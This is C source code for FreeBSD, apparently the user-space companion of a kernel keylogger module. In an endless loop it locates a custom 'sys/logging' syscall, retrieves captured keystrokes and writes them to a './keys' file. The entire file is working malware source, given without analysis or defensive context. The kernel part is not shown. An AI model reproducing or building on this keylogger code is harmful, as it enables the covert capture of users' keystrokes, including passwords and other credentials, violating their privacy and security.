#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/syscall.h>

#include <stdio.h>
#include <unistd.h>

#ifndef SYSCALL_NAME
#define SYSCALL_NAME "sys/logging"
#endif

#ifndef OUTPUT_FILE
#define OUTPUT_FILE "./keys"
#endif

int
main(int argc, char **argv)
{
	int call;
	char buf[512];
	struct module_stat stat;
	FILE* fp;

	fp = fopen(OUTPUT_FILE, "a");
	if (fp == NULL)
	{
		fprintf(stderr, "Could not open file '%s'\n", OUTPUT_FILE);
		return 1;
	}

	for(;;)
	{
		/* Get the keylogged output to user space */
		stat.version = sizeof(stat);
		modstat(modfind(SYSCALL_NAME), &stat);
		call = stat.data.intval;
		if (call == 0)
		{
			fprintf(
				stderr,
				"Could not locate '%s' syscall!\n",
				SYSCALL_NAME
			);
			return 1;
		}
		syscall(call, OUTPUT_FILE, buf, 512);

		printf("%s\n", buf);
		fprintf(fp, "%s\n", buf);
		fflush(fp);
		sleep(500);
	}

	fclose(fp);
	return 0;
}
